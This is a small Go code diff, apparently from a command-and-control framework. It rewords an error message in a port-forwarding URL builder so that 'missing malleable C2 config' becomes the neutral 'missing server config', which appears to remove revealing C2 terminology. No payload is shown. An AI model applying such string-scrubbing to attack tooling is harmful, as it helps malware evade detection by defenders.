@@ -97,7 +97,7 @@ func BuildPortFwdURL(sessionID string) (string, error) {
 	prefix := common.RuntimeConfig.C2Prefix
 	proxyPath := common.RuntimeConfig.ProxyPath
 	if prefix == "" || proxyPath == "" {
-		return "", fmt.Errorf("missing malleable C2 config: C2Prefix=%q ProxyPath=%q", prefix, proxyPath)
+		return "", fmt.Errorf("missing server config: Prefix=%q ProxyPath=%q", prefix, proxyPath)
 	}
 	if def.CCAddress == "" {
 		return "", errors.New("missing CCAddress")
